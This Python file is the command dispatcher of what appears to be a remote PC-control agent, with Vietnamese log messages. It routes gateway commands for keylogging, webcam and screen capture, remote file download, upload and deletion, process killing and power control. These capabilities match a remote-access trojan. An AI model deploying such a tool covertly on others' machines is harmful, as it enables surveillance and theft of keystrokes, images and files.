import json
import logging
import uuid
from config import config

from modules.applications import app_manager
from modules.processes import process_manager
from modules.screenshot import screenshot_manager
from modules.live_screen import live_screen_manager
from modules.keylogger import keylogger_manager
from modules.file_manager import file_manager
from modules.webcam import webcam_manager
from modules.power_control import power_manager

logger = logging.getLogger("CommandHandler")

class CommandDispatcher:
    def __init__(self, gateway_service):
        self.gs = gateway_service

    async def handle(self, message: dict):
        msg_type = message.get("type", "")
        payload = message.get("payload", {})
        message_id = message.get("messageId")
        source = message.get("source", "webapp")

        logger.info(f"Xử lý lệnh: {msg_type}")

        result = self._dispatch(msg_type, payload)
        if result is None:
            logger.warning(f"Không hỗ trợ lệnh: {msg_type}")
            return

        response = self._build_response(message_id, source, result)
        await self.gs.send_response(response)

    def _dispatch(self, msg_type: str, payload: dict) -> dict:
        # === PROCESSES ===
        if msg_type == "process.list":
            return process_manager.list_processes()
        if msg_type == "process.kill":
            return process_manager.kill_process(payload.get("pid"))

        # === APPLICATIONS ===
        if msg_type == "application.list":
            return app_manager.list_apps()
        if msg_type == "application.start":
            return app_manager.start_app(payload.get("path"))
        if msg_type == "application.stop":
            return app_manager.stop_app(payload.get("pid"))

        # === SCREENSHOT ===
        if msg_type == "screenshot.capture":
            raw = screenshot_manager.capture()
            return self._wrap(raw, {"imageBase64": raw.get("image_b64")})

        # === LIVE SCREEN ===
        if msg_type == "livescreen.start":
            return {"success": True, "message": "Live screen started"}
        if msg_type == "livescreen.stop":
            return {"success": True, "message": "Live screen stopped"}
        if msg_type == "livescreen.frame":
            return None

        # === KEYLOGGER ===
        if msg_type == "keylogger.start":
            return keylogger_manager.start()
        if msg_type == "keylogger.stop":
            return keylogger_manager.stop()
        if msg_type == "keylogger.data":
            raw = keylogger_manager.get_entries(clear_after_read=True)
            return self._wrap(raw, {
                "entries": raw.get("entries", []),
                "windowTitle": raw.get("windowTitle", "Unknown")
            })

        # === FILE MANAGER ===
        if msg_type == "file.list":
            return file_manager.list_dir(payload.get("path", ""))
        if msg_type == "file.download":
            return file_manager.download_file(payload.get("path"))
        if msg_type == "file.upload":
            return file_manager.upload_file(
                payload.get("destinationPath"),
                payload.get("content")
            )
        if msg_type == "file.delete":
            return file_manager.delete_file(payload.get("path"))

        # === WEBCAM ===
        if msg_type == "webcam.start":
            return {"success": True, "message": "Webcam started"}
        if msg_type == "webcam.stop":
            return {"success": True, "message": "Webcam stopped"}
        if msg_type == "webcam.capture":
            raw = webcam_manager.capture_photo()
            return self._wrap(raw, {"imageBase64": raw.get("image_b64")})

        # === POWER CONTROL ===
        if msg_type == "power.lock":
            return power_manager.execute("lock")
        if msg_type == "power.restart":
            return power_manager.execute("restart")
        if msg_type == "power.shutdown":
            return power_manager.execute("shutdown")
        if msg_type == "power.sleep":
            return power_manager.execute("sleep")

        # === SYSTEM ===
        if msg_type == "machine.list":
            return {
                "success": True,
                "machines": [{
                    "machineId": config.MACHINE_ID,
                    "hostname": config.HOSTNAME,
                    "ipAddress": config.IP_ADDRESS,
                    "status": "online",
                    "lastSeen": None
                }]
            }

        logger.warning(f"Unknown command type: {msg_type}")
        return {"success": False, "error": f"INVALID_COMMAND: {msg_type}"}

    def _wrap(self, raw: dict, extra: dict) -> dict:
        if not raw.get("success"):
            return raw
        return {**raw, **extra}

    def _build_response(self, message_id: str, source: str, result: dict) -> dict:
        success = result.get("success", False)
        data = {k: v for k, v in result.items() if k not in ("success", "error")}
        payload = {"success": success}
        if success:
            payload["data"] = data
        else:
            payload["error"] = result.get("error", "Unknown error")
        return {
            "messageId": message_id or str(uuid.uuid4()),
            "type": "response",
            "source": config.MACHINE_ID,
            "destination": source,
            "payload": payload
        }
